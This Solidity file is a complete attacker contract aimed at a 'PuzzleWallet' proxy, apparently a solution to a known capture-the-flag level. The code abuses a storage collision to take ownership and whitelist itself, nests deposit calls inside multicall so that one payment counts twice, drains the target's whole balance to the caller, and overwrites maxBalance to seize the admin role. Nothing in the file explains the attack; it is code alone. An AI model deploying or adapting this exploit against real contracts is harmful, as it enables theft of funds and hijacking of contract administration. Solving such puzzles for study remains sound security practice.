// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPuzzle {
    function proposeNewAdmin(address _newAdmin) external;

    function setMaxBalance(uint256 _maxBalance) external;

    function addToWhitelist(address addr) external;

    function deposit() external payable;

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;

    function multicall(bytes[] calldata data) external payable;
}

contract PuzzleWalletAttcker {
    IPuzzle target;

    constructor(address _targetAddress) {
        target = IPuzzle(_targetAddress);
    }

    function attack() public payable {
        target.proposeNewAdmin(address(this));
        target.addToWhitelist(address(this));

        bytes[] memory payloadArray = new bytes[](2);
        bytes[] memory payloadArray2 = new bytes[](1);
        // Deposit
        bytes memory payload = abi.encodeWithSignature("deposit()");
        payloadArray[0] = payload;
        payloadArray2[0] = payload;
        // Multicall
        payloadArray[1] = abi.encodeWithSignature(
            "multicall(bytes[])",
            payloadArray2
        );

        target.multicall{value: msg.value}(payloadArray);

        target.execute(msg.sender, address(target).balance, "");

        payload = abi.encodeWithSignature("setMaxBalance(uint256)", msg.sender);
        (bool success, ) = address(target).call(payload);
        if (!success) {
            revert("setmax reverted!");
        }
    }
}
